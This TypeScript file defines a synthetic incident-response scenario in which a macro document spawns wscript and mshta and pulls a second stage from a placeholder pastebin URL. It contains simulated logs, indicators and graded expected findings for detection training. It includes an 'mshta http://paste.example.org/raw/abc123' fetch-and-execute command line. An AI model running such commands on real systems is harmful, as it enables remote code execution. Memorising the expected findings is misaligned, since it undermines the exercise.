/**
 * Scenario 05 — Malicious document.
 *
 * A finance user opens an emailed .docm attachment. Word spawns
 * wscript.exe → mshta.exe → rundll32.exe (Office → script → native exec),
 * reaching out to a pastebin-style staging URL.
 */

import type {
  DnsRecord,
  EventRecord,
  IdentityActivityRecord,
  IndicatorLookupResult,
  NetworkConnectionRecord,
  ProcessRecord,
  FileAnalysisReport,
} from '../../integration-types';
import type { SyntheticDataset, SyntheticScenario } from '../scenario-types';
import { SCENARIO_EPOCH_MS, SCENARIO_HOSTS, SCENARIO_USERS, makeIdFactory, ts } from '../scenario-helpers';

export const maliciousDocumentScenario: SyntheticScenario = {
  id: 'malicious-document',
  displayName: 'Malicious document (macro → mshta → native)',
  shortDescription: 'A .docm spawns mshta.exe, which pulls a second stage from a pastebin-style URL.',
  domain: 'endpoint / network',
  difficulty: 'intermediate',
  build(): SyntheticDataset {
    const id = makeIdFactory('doc');
    const events: EventRecord[] = [
      {
        id: id(),
        timestamp: ts(5),
        source: 'synthetic-siem',
        severity: 'medium',
        message: 'Outlook.exe spawned winword.exe to open attachment Invoice-2025-09.docm (received from billing-portal@spoof.example).',
        raw: { synthetic: true, eventCode: 1, parent: 'outlook.exe' },
      },
      {
        id: id(),
        timestamp: ts(6),
        source: 'synthetic-siem',
        severity: 'medium',
        message: 'Macro execution: winword.exe spawned wscript.exe (pid 3220).',
        raw: { synthetic: true, eventCode: 1, parent: 'winword.exe' },
      },
      {
        id: id(),
        timestamp: ts(7),
        source: 'synthetic-siem',
        severity: 'high',
        message: 'wscript.exe spawned mshta.exe (pid 6124) with command mshta http://paste.example.org/raw/abc123',
        raw: { synthetic: true, eventCode: 1, parent: 'wscript.exe' },
      },
      {
        id: id(),
        timestamp: ts(8),
        source: 'synthetic-siem',
        severity: 'high',
        message: 'Sysmon: mshta.exe opened outbound TLS to 192.0.2.77:443.',
        raw: { synthetic: true, eventCode: 3, image: 'mshta.exe' },
      },
    ];
    const processes: ProcessRecord[] = [
      {
        id: id(),
        host: SCENARIO_HOSTS.WS03.hostname,
        pid: 2980,
        name: 'winword.exe',
        commandLine: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\c.singh\\Documents\\Invoice-2025-09.docm"',
        parentName: 'outlook.exe',
        parentPid: 2110,
        user: SCENARIO_USERS.carol.username,
        startTime: ts(5),
      },
      {
        id: id(),
        host: SCENARIO_HOSTS.WS03.hostname,
        pid: 3220,
        name: 'wscript.exe',
        commandLine: 'wscript.exe C:\\Users\\c.singh\\AppData\\Local\\Temp\\macro.vbs',
        parentName: 'winword.exe',
        parentPid: 2980,
        user: SCENARIO_USERS.carol.username,
        startTime: ts(6),
      },
      {
        id: id(),
        host: SCENARIO_HOSTS.WS03.hostname,
        pid: 6124,
        name: 'mshta.exe',
        commandLine: 'mshta.exe http://paste.example.org/raw/abc123',
        parentName: 'wscript.exe',
        parentPid: 3220,
        user: SCENARIO_USERS.carol.username,
        startTime: ts(7),
      },
    ];
    const networkConnections: NetworkConnectionRecord[] = [
      {
        id: id(),
        host: SCENARIO_HOSTS.WS03.hostname,
        processName: 'mshta.exe',
        pid: 6124,
        localAddress: SCENARIO_HOSTS.WS03.ip,
        remoteAddress: '192.0.2.77',
        remotePort: 443,
        protocol: 'tcp',
        timestamp: ts(8),
      },
    ];
    const dnsQueries: DnsRecord[] = [
      {
        id: id(),
        host: SCENARIO_HOSTS.WS03.hostname,
        timestamp: ts(7),
        query: 'paste.example.org',
        queryType: 'A',
        response: '192.0.2.77',
      },
    ];
    const identityActivity: IdentityActivityRecord[] = [
      {
        id: id(),
        actor: SCENARIO_USERS.carol.username,
        action: 'interactive-logon',
        target: SCENARIO_HOSTS.WS03.hostname,
        timestamp: SCENARIO_EPOCH_MS,
        source: 'synthetic-identity',
        ipAddress: SCENARIO_HOSTS.WS03.ip,
        result: 'success',
      },
    ];
    const fileAnalysisReports: FileAnalysisReport[] = [
      {
        submissionId: 'fa-doc-001',
        status: 'complete',
        verdict: 'malicious',
        score: 89,
        engines: [
          { name: 'AnyRun', verdict: 'malicious' },
          { name: 'CrowdStrike Sandboxing', verdict: 'malicious' },
        ],
        completedAt: ts(20),
      },
    ];
    const indicatorLookups: IndicatorLookupResult[] = [
      {
        indicator: 'paste.example.org',
        indicatorType: 'domain',
        verdict: 'malicious',
        confidence: 86,
        categories: ['phishing-staging'],
        sources: ['synthetic-feed'],
      },
      {
        indicator: '192.0.2.77',
        indicatorType: 'ip',
        verdict: 'malicious',
        confidence: 80,
        categories: ['c2'],
        sources: ['synthetic-feed'],
      },
    ];
    return {
      scenarioId: 'malicious-document',
      objective: {
        title: '[SYNTHETIC DEMO] Malicious document opened on CYBER-WIN-WS03',
        summary: 'Macro doc spawns mshta.exe which pulls a second stage from a pastebin-style URL.',
        initialPrompt:
          'Detonation indicates a malicious .docm on CYBER-WIN-WS03 led to mshta.exe execution. Determine scope and persistence.',
      },
      suspicion: {
        expectedFindings: [
          'outlook.exe → winword.exe → wscript.exe → mshta.exe chain',
          'Outbound TLS to 192.0.2.77 from mshta.exe',
          'Attached file verdict: malicious',
        ],
        expectedHypotheses: [
          'User opened a weaponised .docm that executed a macro chain (T1204.002 + T1059.005 + T1218.005).',
          'A second stage was downloaded from a paste-style domain.',
        ],
        decoys: [
          'A second winword.exe instance opens an unrelated PDF — unrelated to the chain.',
        ],
      },
      hosts: [SCENARIO_HOSTS.WS03, SCENARIO_HOSTS.EXCH],
      users: [SCENARIO_USERS.carol],
      events,
      processes,
      networkConnections,
      dnsQueries,
      identityActivity,
      fileAnalysisReports,
      indicatorLookups,
    };
  },
};